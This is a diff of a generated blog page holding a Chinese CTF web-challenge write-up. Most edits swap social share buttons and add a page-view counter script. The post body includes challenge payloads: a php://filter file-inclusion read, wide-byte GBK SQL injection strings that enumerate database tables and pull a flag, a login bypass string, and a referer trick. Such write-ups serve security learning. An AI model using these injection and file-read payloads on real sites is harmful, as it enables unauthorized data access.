@@ -326,6 +326,17 @@
     
 
     
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
 
     <!-- Share Weibo -->
     
@@ -338,35 +349,29 @@
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=南邮ctf web&url=http://yoursite.com//2017/03/29/南邮ctf-web/index.html&via=George Lee" target="_blank">
-            <li class="mdl-menu__item">
-                分享到 Twitter
-            </li>
-        </a>
-    
 
     <!-- Share Facebook -->
-    
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com//2017/03/29/南邮ctf-web/index.html" target="_blank">
-            <li class="mdl-menu__item">
-                分享到 Facebook
-            </li>
-        </a>
     
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=http://yoursite.com//2017/03/29/南邮ctf-web/index.html" target="_blank">
+
+    <!-- Share LinkedIn -->
+    
+        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=http://yoursite.com//2017/03/29/南邮ctf-web/index.html&title=南邮ctf web" target="_blank">
             <li class="mdl-menu__item">
-                分享到 Google+
+                分享到 LinkedIn
             </li>
         </a>
     
 
-    <!-- Share LinkedIn -->
-    
-
     <!-- Share QQ -->
+    
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=凡尘&title=南邮ctf web&summary=Nothing is difficult to the man who will try.&pics=http://yoursite.com/img/favicon.png&url=http://yoursite.com/2017/03/29/南邮ctf-web/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 QQ
+            </li>
+        </a>
     
 
     <!-- Share Telegram -->
@@ -384,7 +389,7 @@
 <p>查看源码就可得到</p>
 <p><strong>md5 collision</strong></p>
 <p>Poc:a=240610708</p>
-<a id="more"></a>
+<p>&lt;!--more--&gt;</p>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20160901180637.png" alt=""></p>
 <p><strong>签到2</strong></p>
 <p>关键点：输入框设定了最大的长度限制</p>
@@ -395,7 +400,7 @@
 <p><strong>单身二十年</strong></p>
 <p>源码点击./search_key.php，getflag</p>
 <p><strong>你从哪里来</strong></p>
-<p>referer: <a href="http://www.google.com" target="_blank" rel="external">http://www.google.com</a></p>
+<p>referer: http://www.google.com</p>
 <p><strong>文件包含</strong></p>
 <p>Poc：file=php://filter/convert.base64-encode/resource=index.php</p>
 <p><strong>单身一百年也没用</strong></p>
@@ -409,14 +414,14 @@
 <p>2、sql.php?id=1024.00001</p>
 <p><strong>sql injection 3</strong></p>
 <p>id=2,gbk</p>
-<p>id=1%df’ union select 1,2 –+</p>
-<p>id=1%df’ union select database(),2 –+         </p>
+<p>id=1%df' union select 1,2 --+</p>
+<p>id=1%df' union select database(),2 --+</p>
 <p>回显sqli</p>
-<p>id=1%df’ union select 1,table_name from information_schema.tables where table_schema=0x73716C6931</p>
+<p>id=1%df' union select 1,table_name from information_schema.tables where table_schema=0x73716C6931</p>
 <p>回显 falg</p>
-<p>id=1%df’ union select 1,cloumn_name from information_schema.columns where table_schema=0x73716C6931</p>
+<p>id=1%df' union select 1,cloumn_name from information_schema.columns where table_schema=0x73716C6931</p>
 <p>回显 fl4g</p>
-<p>id=1%df’ union select 1,fl4g from  flag –+</p>
+<p>id=1%df' union select 1,fl4g from  flag --+</p>
 <p><strong>/x00</strong></p>
 <p>Poc:nctf[]=1.#biubiubiu</p>
 <p><strong>bypass again</strong></p>
@@ -430,7 +435,7 @@
 <p><strong>上传绕过</strong></p>
 <p>截断 <a href="http://www.myhack58.com/Article/html/3/8/2013/36507.htm" target="_blank" rel="external">截断上传绕过</a></p>
 <p><strong>SQL注入1</strong></p>
-<p>admin’)#&amp;111</p>
+<p>admin')#&amp;111</p>
 <p><strong>pass check</strong></p>
 <p>输入123，抓包改为传入数组</p>
 <p><strong>起名字真难</strong></p>
@@ -648,29 +653,11 @@ It will not impact the appearance and can give developers a lot of support :)
         <div class="mdl-mini-footer--left-section sns-list">
     <!-- Twitter -->
     
-        <a href="https://twitter.com/twitter" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-twitter.png);">
-                <span class="visuallyhidden">Twitter</span>
-            </button><!--
-     --></a>
-    
 
     <!-- Facebook -->
     
-        <a href="https://www.facebook.com/facebook" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-facebook.png);">
-                <span class="visuallyhidden">Facebook</span>
-            </button><!--
-     --></a>
-    
 
     <!-- Google + -->
-    
-        <a href="https://www.google.com/" target="_blank">
-            <button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-gplus.png);">
-                <span class="visuallyhidden">Google Plus</span>
-            </button><!--
-     --></a>
     
 
     <!-- Weibo -->
@@ -689,6 +676,12 @@ It will not impact the appearance and can give developers a lot of support :)
     
 
     <!-- Github -->
+    
+        <a href="https://github.com/dropslzx" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn" style="background-image: url(/img/footer/footer_ico-github.png);">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
     
 
     <!-- LinkedIn -->
@@ -768,6 +761,9 @@ It will not impact the appearance and can give developers a lot of support :)
 
 
 
+
+    <!-- Busuanzi -->
+    <script src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
